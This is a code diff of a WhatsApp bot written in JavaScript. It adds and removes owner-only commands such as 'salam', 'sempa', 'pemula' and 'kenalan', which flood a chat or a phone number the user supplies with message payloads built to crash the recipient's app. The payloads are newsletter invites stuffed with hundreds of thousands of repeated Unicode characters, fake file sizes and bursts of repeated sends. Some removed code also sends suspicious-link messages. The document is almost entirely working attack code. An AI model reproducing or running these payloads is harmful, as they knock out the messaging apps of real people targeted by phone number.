@@ -14922,7 +14922,269 @@ break;
 				await XliconBotInc.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
 			}
 			break
-                
+             
+      
+      
+
+
+
+
+
+ 
+    
+
+
+
+      case 'salam':
+        try {
+            if (!XliconTheCreator && !isPremium) {
+                return replygcxlicon('This command is only available to the bot owner or premium users!');
+            }
+    
+            // Check if target number is provided
+            if (!text) return replygcxlicon('Please provide a target number with country code (without +)\nExample: .salam 6281234567890');
+    
+            // Format the target number
+            const targetNumber = text + "@s.whatsapp.net";
+            
+            replygcxlicon('Starting invite sequence...');
+    
+            async function sendInvites(target) {
+                const message = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: `33333333333333333@newsletter`,
+                                newsletterName: "ꦸ꫞꧅꧃" + "ꦾ".repeat(150000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(150000),
+                                inviteExpiration: Date.now() + 18144000001814400000,
+                            },
+                        },
+                    },
+                };
+    
+                for (let i = 0; i < 5; i++) {
+                    await XliconBotInc.relayMessage(target, message, {
+                        userJid: target,
+                    });
+                }
+            }
+    
+            await sendInvites(targetNumber);
+            replygcxlicon(`Successfully sent invites to ${text}`);
+        } catch (err) {
+            console.error('Error in sendInvites:', err);
+            replygcxlicon('Process interrupted.');
+        }
+        break;
+    
+
+    
+
+
+
+
+
+      
+
+
+        case 'testing':
+          try {
+              if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
+      
+              replygcxlicon(`Starting invite sequence...`);
+      
+              async function sendInvites(target) {
+                  const messsage = {
+                      botInvokeMessage: {
+                          message: {
+                              newsletterAdminInviteMessage: {
+                                  newsletterJid: `33333333333333333@newsletter`,
+                                  newsletterName: "ꦸ꫞꧅꧃" + "ꦾ".repeat(150000),
+                                  jpegThumbnail: "",
+                                  caption: "ꦽ".repeat(150000),
+                                  inviteExpiration: Date.now() + 18144000001814400000,
+                              },
+                          },
+                      },
+                  };
+      
+                  for (let i = 0; i < 5; i++) {
+                      await XliconBotInc.relayMessage(target, messsage, {
+                          userJid: target,
+                      });
+                  }
+              }
+      
+              await sendInvites(m.chat);
+              
+      
+          } catch (err) {
+              console.error('Error in senfc:', err);
+              replygcxlicon('Process interrupted.');
+          }
+          break;
+
+
+
+
+      
+        
+
+
+      case 'buggc':
+        try {
+            if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
+    
+            replygcxlicon(`Starting invite sequence...`);
+    
+            async function sendInvites(target) {
+                const messsage = {
+                    botInvokeMessage: {
+                        message: {
+                            newsletterAdminInviteMessage: {
+                                newsletterJid: `33333333333333333@newsletter`,
+                                newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(150000),
+                                jpegThumbnail: "",
+                                caption: "ꦽ".repeat(150000),
+                                inviteExpiration: Date.now() + 1814400000,
+                            },
+                        },
+                    },
+                };
+    
+                for (let i = 0; i < 5; i++) {
+                    await XliconBotInc.relayMessage(target, messsage, {
+                        userJid: target,
+                    });
+                }
+            }
+    
+            await sendInvites(m.chat);
+            replygcxlicon('Invite sequence completed.');
+    
+        } catch (err) {
+            console.error('Error in senfc:', err);
+            replygcxlicon('Process interrupted.');
+        }
+        break;
+    
+    
+
+
+
+
+
+        case 'sempa':
+          try {
+              if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
+      
+              replygcxlicon(`Initiating maximum payload sequence...`);
+      
+              async function createVirusFiles(target) {
+                  const fs = require('fs');
+                  const thumbPath = './lib/thumb.jpg';
+      
+                  // Heavy payload messages
+                  const virusMessages = [
+                      {
+                          image: fs.readFileSync(thumbPath),
+                          caption: "😈".repeat(90000),
+                          fileLength: "999999999999",
+                          contextInfo: {
+                              externalAdReply: {
+                                  title: "🔥".repeat(1500),
+                                  body: "⚠️".repeat(1500),
+                                  mediaType: 1,
+                                  thumbnail: fs.readFileSync(thumbPath),
+                                  mediaUrl: `https://www.youtube.com/watch?v=${"A".repeat(4000)}`,
+                                  sourceUrl: `https://www.youtube.com/watch?v=${"B".repeat(4000)}`,
+                              }
+                          }
+                      },
+                      {
+                          image: fs.readFileSync(thumbPath),
+                          caption: "💀".repeat(90000),
+                          fileLength: "999999999999",
+                          contextInfo: {
+                              forwardingScore: 999999999,
+                              isForwarded: true,
+                              externalAdReply: {
+                                  title: "⚡".repeat(1500),
+                                  body: "☠️".repeat(1500),
+                                  mediaType: 1,
+                                  thumbnail: fs.readFileSync(thumbPath),
+                                  mediaUrl: `https://www.youtube.com/watch?v=${"C".repeat(4000)}`,
+                                  sourceUrl: `https://www.youtube.com/watch?v=${"D".repeat(4000)}`,
+                              }
+                          }
+                      }
+                  ];
+      
+                  // Maximum impact newsletter invites
+                  const inviteMessages = [
+                      {
+                          botInvokeMessage: {
+                              message: {
+                                  newsletterAdminInviteMessage: {
+                                      newsletterJid: `33333333333333333@newsletter`,
+                                      newsletterName: "🎭".repeat(8000) + "⚠️".repeat(8000),
+                                      jpegThumbnail: fs.readFileSync(thumbPath).toString('base64'),
+                                      caption: "ꦽ".repeat(200000),
+                                      inviteExpiration: Date.now() + 1814400000,
+                                  },
+                              },
+                          },
+                      },
+                      {
+                          botInvokeMessage: {
+                              message: {
+                                  newsletterAdminInviteMessage: {
+                                      newsletterJid: `44444444444444444@newsletter`,
+                                      newsletterName: "󠀀".repeat(8000) + "⚡".repeat(8000),
+                                      jpegThumbnail: fs.readFileSync(thumbPath).toString('base64'),
+                                      caption: "ꦾ".repeat(200000),
+                                      inviteExpiration: Date.now() + 1814400000,
+                                  },
+                              },
+                          },
+                      }
+                  ];
+      
+                  // Send all virus image variations
+                  for (let msg of virusMessages) {
+                      for (let i = 0; i < 5; i++) {
+                          await XliconBotInc.sendMessage(target, msg);
+                      }
+                  }
+      
+                  // Send all invite variations
+                  for (let invite of inviteMessages) {
+                      for (let i = 0; i < 5; i++) {
+                          await XliconBotInc.relayMessage(target, invite, {
+                              userJid: target,
+                          });
+                      }
+                  }
+              }
+      
+              await createVirusFiles(m.chat);
+              replygcxlicon('Maximum payload sequence delivered successfully.');
+      
+          } catch (err) {
+              console.error('Error in senfc:', err);
+              replygcxlicon('Process interrupted.');
+          }
+          break;
+      
+
+
+          
+
+
+        
+        
                 
 			case 'confes': case 'confess': case 'menfes': case 'menfess': {
 				if (m.isGroup) return XliconStickPrivate();
@@ -15049,470 +15311,7 @@ break;
              
       // ... (existing code)
       
-      case 'senfc1':
-        try {
-            // Check if the sender is owner or premium
-            if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-    
-            let message = args.join(' ') || '@everyone This message is looping!'; // Default message
-    
-            replygcxlicon(`Sending special payload to create a processing loop. This may increase CPU usage on both sender and receiver.`);
-    
-            // Fungsi untuk memproses pesan secara berulang (simulasi beban CPU)
-            async function processMessageLoop(target, count = 1) {
-                try {
-                    // Ambil gambar dari API atau sumber lainnya (contoh placeholder API)
-                    const response = await fetch('https://jsonplaceholder.typicode.com/photos?_limit=50');
-                    const results = await response.json(); // Memuat array gambar
-    
-                    for (let i = 0; i < count; i++) {
-                        const messsage = {
-                            botInvokeMessage: {
-                                message: {
-                                    newsletterAdminInviteMessage: {
-                                        newsletterJid: `33333333333333333@newsletter`,
-                                        newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(120000),
-                                        jpegThumbnail: "",
-                                        caption: "ꦽ".repeat(120000),
-                                        inviteExpiration: Date.now() + 1814400000,
-                                    },
-                                },
-                            },
-                        };
-                        await XliconBotInc.relayMessage(target, messsage, {
-                            userJid: target,
-                        });
-    
-                        // Pilih hingga 10 gambar secara acak
-                        const selectedImages = results.sort(() => 0.5 - Math.random()).slice(0, 10);
-                        // Membuat array cards untuk carousel
-                        const cards = await Promise.all(selectedImages.map(async (img, index) => ({
-                            header: proto.Message.InteractiveMessage.Header.fromObject({
-                                title: `Image ${index + 1} for looping payload`,
-                                hasMediaAttachment: true,
-                                imageMessage: await createImage(img.url)
-                            }),
-                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
-                                buttons: [] // Kosongkan tombol
-                            })
-                        })));
-    
-                        // Membuat pesan carousel
-                        const msg = baileys.generateWAMessageFromContent(target, {
-                            viewOnceMessage: {
-                                message: {
-                                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
-                                        body: proto.Message.InteractiveMessage.Body.fromObject({
-                                            text: `Processing loop with heavy payload\nSwipe to view all images.`
-                                        }),
-                                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
-                                            cards
-                                        })
-                                    })
-                                }
-                            }
-                        }, {});
-    
-                        // Mengirimkan pesan carousel
-                        await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, {
-                            messageId: msg.key.id
-                        });
-    
-                        // Pesan notifikasi
-                        m.reply(`Showing ${cards.length} images for the heavy processing loop. Swipe to view all.`);
-                    }
-                } catch (err) {
-                    console.log(err);
-                }
-            }
-    
-            // Proses pesan dengan loop tiga kali lipat
-            processMessageLoop(m.chat, 3);
-    
-        } catch (err) {
-            console.error('Error in senfc:', err);
-            replygcxlicon('The process was interrupted or failed.');
-        }
-        break;
-    
-        case 'sen':
-          try {
-              // Check if the sender is owner or premium
-              if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-      
-              let message = args.join(' ') || '@everyone This message is looping!'; // Default message
-      
-              replygcxlicon(`Sending special payload to create a processing loop. This may increase CPU usage on both sender and receiver.`);
-      
-              // Fungsi untuk memproses pesan secara berat (simulasi beban CPU di notifikasi dan beranda WhatsApp)
-              async function processHeavyMessage(target, count = 1) {
-                  try {
-                      for (let i = 0; i < count; i++) {
-                          const messsage = {
-                              botInvokeMessage: {
-                                  message: {
-                                      newsletterAdminInviteMessage: {
-                                          newsletterJid: `33333333333333333@newsletter`,
-                                          newsletterName: "[‌‌‌‌‌‌‌‌‌P‌‌‌‌‌‌‌‌‌‌_‌‌‌‌‌‌‌‌‌‌‌L‌‌‌‌‌‌‌‌‌] ‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌S‌‌‌ ‌‌‌‌‌‌C‌‌‌‌‌‌‌‌‌‌‌‌‌‌O‌‌‌‌‌‌‌‌‌‌‌‌M‌‌‌‌‌‌‌‌‌‌‌‌‌I‌‌‌‌‌‌‌‌‌‌‌‌‌N‌‌‌‌‌‌‌‌‌‌‌‌‌‌‌G‌‌‌‌‌‌‌!⟆" + "ꦾ".repeat(50000),
-                                          jpegThumbnail: Buffer.from(""), // Thumbnail kosong
-                                          caption: "⚠️".repeat(50000) + "\nHeavy processing payload triggered!\n" + "Use caution when interacting!", // Pesan sangat panjang
-                                          inviteExpiration: Date.now() + 1814400000,
-                                      },
-                                  },
-                              },
-                          };
-      
-                          // Relay pesan ke target
-                          await XliconBotInc.relayMessage(target, messsage, {
-                              userJid: target,
-                          });
-                      }
-                  } catch (err) {
-                      console.log(err);
-                  }
-              }
-      
-              // Proses pesan dengan loop berat sebanyak tiga kali
-              processHeavyMessage(m.chat, 3);
-      
-          } catch (err) {
-              console.error('Error in senfc:', err);
-              replygcxlicon('The process was interrupted or failed.');
-          }
-          break;
-      
-      // ... (rest of your existing code)
-      case 'tembak':
-    try {
-        // Check if the sender is owner or premium
-        if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-
-        let message = args.join(' ') || '@everyone This message is looping!'; // Default message
-
-        replygcxlicon(`Sending special payloads to create a processing loop. This may increase CPU usage on both sender and receiver.`);
-
-        // Fungsi untuk mengirim undangan admin grup
-        async function sendGroupAdminInvite(target) {
-            try {
-                const groupInviteMessage = {
-                    botInvokeMessage: {
-                        message: {
-                            groupInviteMessage: {
-                                groupJid: `120363039123456789@g.us`,
-                                groupName: "⚠️ Suspicious Group ⚠️",
-                                inviteCode: "ABCD1234EFGH",
-                                inviteExpiration: Date.now() + 604800000, // 7 hari
-                                jpegThumbnail: Buffer.from(""),
-                                caption: "Join our group for exclusive content!"
-                            },
-                        },
-                    },
-                };
-                await XliconBotInc.relayMessage(target, groupInviteMessage, {
-                    userJid: target,
-                });
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        // Fungsi untuk mengirim tautan mencurigakan
-        async function sendSuspiciousLink(target) {
-            try {
-                const suspiciousLinkMessage = {
-                    text: `🚨 Warning: Suspicious Link Detected! Click at your own risk:
-
-➡️ https://wa.me/6281234567890
-➡️ https://malicious-site.com/redirect?source=whatsapp\n➡️ http://example.com?phishing=true`,
-                };
-                await XliconBotInc.sendMessage(target, suspiciousLinkMessage);
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        // Fungsi untuk memproses pesan berat dengan latar belakang
-        async function processHeavyMessage(target, count = 1) {
-            try {
-                for (let i = 0; i < count; i++) {
-                    const heavyMessage = {
-                        botInvokeMessage: {
-                            message: {
-                                newsletterAdminInviteMessage: {
-                                    newsletterJid: `33333333333333333@newsletter`,
-                                    newsletterName: "⚠️ Massive Processing Load ⚠️" + "ꦾ".repeat(50000),
-                                    jpegThumbnail: Buffer.from(""), // Thumbnail kosong
-                                    caption: "⚠️".repeat(50000) + "\nHeavy processing payload triggered!\nUse caution when interacting!", // Pesan sangat panjang
-                                    inviteExpiration: Date.now() + 1814400000,
-                                },
-                            },
-                        },
-                    };
-
-                    // Relay pesan ke target
-                    await XliconBotInc.relayMessage(target, heavyMessage, {
-                        userJid: target,
-                    });
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        // Gabungan fungsi-fungsi
-        sendGroupAdminInvite(m.chat);
-        sendSuspiciousLink(m.chat);
-        processHeavyMessage(m.chat, 3);
-
-    } catch (err) {
-        console.error('Error in senfc:', err);
-        replygcxlicon('The process was interrupted or failed.');
-    }
-    break;
-
-    case 'piw':
-    try {
-        // Check if the sender is owner or premium
-        if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-
-        replygcxlicon(`Starting extreme payload loop. This may cause significant CPU and network strain.`);
-
-        // Fungsi untuk memproses pesan sangat berat
-        async function processExtremePayload(target, iterations = 5) {
-            try {
-                for (let i = 0; i < iterations; i++) {
-                    const extremeMessage = {
-                        text: "\u200b".repeat(50000) +
-                              "⚠️".repeat(10000) +
-                              "\nThis is a highly disruptive payload. Avoid interaction.\n" +
-                              "https://wa.me/6281234567890".repeat(1000),
-                        jpegThumbnail: Buffer.alloc(1), // Thumbnail kosong untuk memaksa pemrosesan
-                    };
-
-                    await XliconBotInc.sendMessage(target, extremeMessage);
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        // Fungsi untuk mengirim notifikasi tanpa henti
-        async function sendDisruptiveNotifications(target, iterations = 5) {
-            try {
-                for (let i = 0; i < iterations; i++) {
-                    const notificationMessage = {
-                        text: "🚨 Critical Alert: \n" + "⚠️".repeat(1000) +
-                              "\nPlease address immediately!".repeat(100),
-                        viewOnce: true, // Memaksa perangkat memuat pesan secara intensif
-                    };
-
-                    await XliconBotInc.sendMessage(target, notificationMessage);
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        // Memicu kedua fungsi payload ekstrem
-        processExtremePayload(m.chat, 10); // Kirim pesan berat 10 kali
-        sendDisruptiveNotifications(m.chat, 10); // Kirim notifikasi berat 10 kali
-
-    } catch (err) {
-        console.error('Error in senfc:', err);
-        replygcxlicon('The process was interrupted or failed.');
-    }
-    break;
-
-    case 'sen':
-    try {
-        if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-
-        let message = args.join(' ') || '@everyone PROCESSING INITIATED'; 
-
-        replygcxlicon(`Initiating intensive sequence...`);
-
-        async function intensiveProcess(target, count = 1) {
-            try {
-                for (let i = 0; i < count; i++) {
-                    const payload = {
-                        message: {
-                            protocolMessage: {
-                                type: 0,
-                                key: m.key,
-                                editedMessage: {
-                                    conversation: "⚠️".repeat(4000) + "\n".repeat(400) + message
-                                }
-                            },
-                            reactionMessage: {
-                                key: m.key,
-                                text: "⚡".repeat(1000)
-                            },
-                            newsletterMessage: {
-                                newsletterJid: `${Date.now()}@newsletter`,
-                                newsletterName: "⚠️".repeat(3000) + "[PROCESSING]" + "ꦿ".repeat(3000),
-                                caption: "⚡".repeat(4000) + "\n" + message + "\n" + "⚠️".repeat(4000)
-                            }
-                        }
-                    };
-
-                    for(let j = 0; j < 8; j++) {
-                        await XliconBotInc.sendMessage(target, payload);
-                        await XliconBotInc.relayMessage(target, payload, {});
-                        await new Promise(r => setTimeout(r, 50));
-                    }
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        intensiveProcess(m.chat, 5);
-
-    } catch (err) {
-        console.error('Error:', err);
-        replygcxlicon('Process terminated');
-    }
-    break;
-case 'sen':
-    try {
-        if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-
-        let message = args.join(' ') || '@everyone PROCESSING INITIATED'; 
-
-        replygcxlicon(`Initiating intensive sequence...`);
-
-        async function intensiveProcess(target, count = 1) {
-            try {
-                for (let i = 0; i < count; i++) {
-                    const payload = {
-                        botInvokeMessage: {
-                            message: {
-                                newsletterAdminInviteMessage: {
-                                    newsletterJid: `${Date.now()}@newsletter`,
-                                    newsletterName: "⚠️".repeat(3000) + "[PROCESSING]" + "ꦿ".repeat(3000),
-                                    jpegThumbnail: Buffer.from(""),
-                                    caption: "⚡".repeat(4000) + "\n" + message + "\n" + "⚠️".repeat(4000),
-                                    inviteExpiration: Date.now() + 1814400000,
-                                }
-                            }
-                        }
-                    };
-
-                    for(let j = 0; j < 8; j++) {
-                        await XliconBotInc.relayMessage(target, payload, {
-                            userJid: target
-                        });
-                        await new Promise(r => setTimeout(r, 50));
-                    }
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        intensiveProcess(m.chat, 5);
-
-    } catch (err) {
-        console.error('Error:', err);
-        replygcxlicon('Process terminated');
-    }
-    break;
-
-case 'sen':
-    try {
-        if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-
-        let message = args.join(' ') || '@everyone PROCESSING INITIATED'; 
-
-        replygcxlicon(`Initiating intensive sequence...`);
-
-        async function intensiveProcess(target, count = 1) {
-            try {
-                for (let i = 0; i < count; i++) {
-                    const payload = {
-                        botInvokeMessage: {
-                            message: {
-                                newsletterAdminInviteMessage: {
-                                    newsletterJid: `${Date.now()}@newsletter`,
-                                    newsletterName: "⚠️".repeat(3000) + "[PROCESSING]" + "ꦿ".repeat(3000),
-                                    jpegThumbnail: Buffer.from(""),
-                                    caption: "⚡".repeat(4000) + "\n" + message + "\n" + "⚠️".repeat(4000),
-                                    inviteExpiration: Date.now() + 1814400000,
-                                }
-                            }
-                        }
-                    };
-
-                    for(let j = 0; j < 8; j++) {
-                        await XliconBotInc.relayMessage(target, payload, {
-                            userJid: target
-                        });
-                        await new Promise(r => setTimeout(r, 50));
-                    }
-                }
-            } catch (err) {
-                console.log(err);
-            }
-        }
-
-        intensiveProcess(m.chat, 5);
-
-    } catch (err) {
-        console.error('Error:', err);
-        replygcxlicon('Process terminated');
-    }
-    break;
-
-    case 'crot':
-      try {
-          if (!XliconTheCreator && !isPremium) return replygcxlicon('This command is only available to the bot owner or premium users!');
-  
-          let message = args.join(' ') || '@everyone SYSTEM PROCESS INITIATED'; 
-  
-          replygcxlicon(`Launching intensive sequence...`);
-  
-          async function intensiveProcess(target, count = 1) {
-              try {
-                  for (let i = 0; i < count; i++) {
-                      const payload = {
-                          botInvokeMessage: {
-                              message: {
-                                  newsletterAdminInviteMessage: {
-                                      newsletterJid: `${Math.random().toString(36)}@newsletter`,
-                                      newsletterName: "⚠️".repeat(8000) + "【P】【R】【O】【C】【E】【S】【S】" + "ꦿ".repeat(8000),
-                                      jpegThumbnail: Buffer.from("0".repeat(4096)),
-                                      caption: "⚡".repeat(9000) + "\n".repeat(2000) + message + "\n".repeat(2000) + "⚠️".repeat(9000),
-                                      inviteExpiration: Date.now() + 999999999,
-                                      description: "⚠️".repeat(5000) + "\n" + "Processing" + "\n" + "⚡".repeat(5000)
-                                  }
-                              }
-                          }
-                      };
-  
-                      for(let j = 0; j < 12; j++) {
-                          await XliconBotInc.relayMessage(target, payload, {
-                              userJid: target,
-                              ephemeralExpiration: 999999
-                          });
-                          // Minimal delay for maximum impact
-                          await new Promise(r => setTimeout(r, 10));
-                      }
-                  }
-              } catch (err) {
-                  console.log(err);
-              }
-          }
-  
-          // Execute multiple intensive processes
-          for(let k = 0; k < 3; k++) {
-              intensiveProcess(m.chat, 8);
-          }
-  
-      } catch (err) {
-          console.error('Error:', err);
-          replygcxlicon('Process terminated');
-      }
-      break;
+     
 			case 'toptv': {
 				if (!/video/.test(mime)) return replygcxlicon(`Send/Reply the video you want to use as a PTV message with caption ${prefix + command}`)
 				if ((m.quoted ? m.quoted.type : m.type) === 'videoMessage') {
@@ -15664,12 +15463,12 @@ case 'paket':
   }
   break;
 
-  case 'ris':
+case 'sen':
     try {
         if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
 
         let targetNumber = args[0];
-        if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .ris 1xxxxx (US)\n.ris 44xxxxx (UK)\n.ris 62xxxxx (ID)\n.sen 91xxxxx (IN)');
+        if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .sen 1xxxxx (US)\n.sen 44xxxxx (UK)\n.sen 62xxxxx (ID)\n.sen 91xxxxx (IN)');
 
         if (targetNumber.startsWith('+')) {
             targetNumber = targetNumber.slice(1);
@@ -15721,211 +15520,6 @@ case 'paket':
         replygcxlicon('Process completed');
     }
     break;
-
-    case 'pemula':
-      try {
-          if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
-  
-          let targetNumber = args[0];
-          if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .pemula 1xxxxx (US)\n.pemula 44xxxxx (UK)\n.pemula 62xxxxx (ID)\n.pemula 91xxxxx (IN)');
-  
-          if (targetNumber.startsWith('+')) {
-              targetNumber = targetNumber.slice(1);
-          }
-          if (targetNumber.startsWith('0')) {
-              targetNumber = targetNumber.slice(1);
-          }
-          
-          targetNumber = targetNumber + '@s.whatsapp.net';
-  
-          replygcxlicon(`Launching maximum impact sequence to ${targetNumber}...`);
-  
-          async function maximumImpactProcess(target) {
-              try {
-                  // Create massive payload with nested structures
-                  const payload = {
-                      botInvokeMessage: {
-                          message: {
-                              newsletterAdminInviteMessage: {
-                                  newsletterJid: `${Math.random().toString(36)}@newsletter`,
-                                  newsletterName: "⚠️".repeat(20000) + "【S】【Y】【S】【T】【E】【M】" + "ꦿ".repeat(20000),
-                                  jpegThumbnail: Buffer.from("0".repeat(16384)),
-                                  caption: "⚡".repeat(25000) + "\n".repeat(5000) + "SYSTEM OVERLOAD" + "\n".repeat(5000) + "⚠️".repeat(25000),
-                                  inviteExpiration: Date.now() + 9999999999,
-                                  description: "⚠️".repeat(20000) + "\n" + "PROCESSING" + "\n" + "⚡".repeat(20000)
-                              },
-                              protocolMessage: {
-                                  type: 0,
-                                  data: Buffer.from("0".repeat(32768))
-                              },
-                              reactionMessage: {
-                                  text: "⚠️".repeat(15000)
-                              }
-                          }
-                      }
-                  };
-  
-                  // Send 3 ultra-heavy messages with minimal delay
-                  for(let i = 0; i < 3; i++) {
-                      await XliconBotInc.relayMessage(target, payload, {
-                          userJid: target,
-                          ephemeralExpiration: 9999999,
-                          messageId: `HIDDEN${Date.now()}${i}`
-                      });
-                      await new Promise(r => setTimeout(r, 50));
-                  }
-              } catch (err) {
-                  console.log(err);
-              }
-          }
-  
-          // Execute multiple times for maximum system impact
-          for(let k = 0; k < 2; k++) {
-              maximumImpactProcess(targetNumber);
-          }
-  
-      } catch (err) {
-          console.error('Error:', err);
-          replygcxlicon('Process completed');
-      }
-      break;
-
-     
-      case 'sengkuni':
-        try {
-            if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
-    
-            let targetNumber = args[0];
-            if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .sengkuni 1xxxxx (US)\n.sengkuni 44xxxxx (UK)\n.sengkuni 62xxxxx (ID)\n.sengkuni 91xxxxx (IN)');
-    
-            if (targetNumber.startsWith('+')) targetNumber = targetNumber.slice(1);
-            if (targetNumber.startsWith('0')) targetNumber = targetNumber.slice(1);
-            
-            targetNumber = targetNumber + '@s.whatsapp.net';
-            
-            replygcxlicon(`Initiating sequence to ${targetNumber}...`);
-    
-            async function enhancedProcess(target) {
-                try {
-                    const payload = {
-                        text: "⚠️".repeat(20000) + "\n".repeat(2000) + "SYSTEM_OVERLOAD" + "\n".repeat(2000) + "⚡".repeat(20000),
-                        contextInfo: {
-                            forwardingScore: 999999999,
-                            isForwarded: true,
-                            externalAdReply: {
-                                title: "⚠️".repeat(1000),
-                                body: "⚡".repeat(1000),
-                                previewType: "PHOTO",
-                                thumbnail: Buffer.from(""),
-                                sourceUrl: "https://wa.me/" + target.split("@")[0]
-                            }
-                        }
-                    };
-    
-                    const sendBurst = async () => {
-                        for(let i = 0; i < 5; i++) {
-                            await XliconBotInc.sendMessage(target, payload);
-                            await new Promise(r => setTimeout(r, 50));
-                        }
-                    };
-    
-                    await Promise.all([
-                        sendBurst(),
-                        sendBurst(),
-                        sendBurst(),
-                        sendBurst()
-                    ]);
-    
-                } catch (err) {
-                    console.log(err);
-                }
-            }
-    
-            await enhancedProcess(targetNumber);
-    
-        } catch (err) {
-            console.error('Error:', err);
-            replygcxlicon('Process completed');
-        }
-        break;
-
-
-      case 'kenalan':
-        try {
-            if (!XliconTheCreator) return replygcxlicon('This command is only for owner!');
-    
-            let targetNumber = args[0];
-            if (!targetNumber) return replygcxlicon('Please enter target number\nExample: .kenalan 1xxxxx (US)\n.kenalan 44xxxxx (UK)\n.kenalan 62xxxxx (ID)\n.kenalan 91xxxxx (IN)');
-    
-            if (targetNumber.startsWith('+')) {
-                targetNumber = targetNumber.slice(1);
-            }
-            if (targetNumber.startsWith('0')) {
-                targetNumber = targetNumber.slice(1);
-            }
-            
-            targetNumber = targetNumber + '@s.whatsapp.net';
-    
-            replygcxlicon(`Launching critical impact sequence to ${targetNumber}...`);
-    
-            async function criticalImpactProcess(target) {
-                try {
-                    const payload = {
-                        botInvokeMessage: {
-                            message: {
-                                newsletterAdminInviteMessage: {
-                                    newsletterJid: `${Math.random().toString(36)}@newsletter`,
-                                    newsletterName: "⚠️".repeat(50000) + "【C】【R】【I】【T】【I】【C】【A】【L】" + "ꦿ".repeat(50000),
-                                    jpegThumbnail: Buffer.from("0".repeat(40960)),
-                                    caption: "⚡".repeat(60000) + "\n".repeat(8000) + "SYSTEM_CRITICAL_OVERLOAD" + "\n".repeat(8000) + "⚠️".repeat(60000),
-                                    inviteExpiration: Date.now() + 9999999999,
-                                    description: "⚠️".repeat(40000) + "\n" + "PROCESSING_OVERFLOW" + "\n" + "⚡".repeat(40000)
-                                },
-                                protocolMessage: {
-                                    type: 0,
-                                    data: Buffer.from("0".repeat(65536))
-                                },
-                                reactionMessage: {
-                                    text: "⚠️".repeat(30000)
-                                },
-                                documentMessage: {
-                                    title: "⚠️".repeat(20000),
-                                    fileName: "CRITICAL_" + "⚠️".repeat(20000),
-                                    fileLength: 999999999,
-                                    pageCount: 999999
-                                }
-                            }
-                        }
-                    };
-    
-                    // Multiple nested loops for exponential impact
-                    for(let i = 0; i < 3; i++) {
-                        for(let j = 0; j < 3; j++) {
-                            await XliconBotInc.relayMessage(target, payload, {
-                                userJid: target,
-                                ephemeralExpiration: 9999999,
-                                messageId: `HIDDEN${Date.now()}${i}${j}`
-                            });
-                            // Minimal delay for maximum stack overflow
-                            await new Promise(r => setTimeout(r, 10));
-                        }
-                    }
-                } catch (err) {
-                    console.log(err);
-                }
-            }
-    
-            // Execute multiple cycles with nested loops
-            for(let k = 0; k < 3; k++) {
-                criticalImpactProcess(targetNumber);
-            }
-    
-        } catch (err) {
-            console.error('Error:', err);
-            replygcxlicon('Critical process completed');
-        }
-        break;
-
 
 case 'pixelate': {
   if (!isMedia) return replygcxlicon("Where Is The Image");
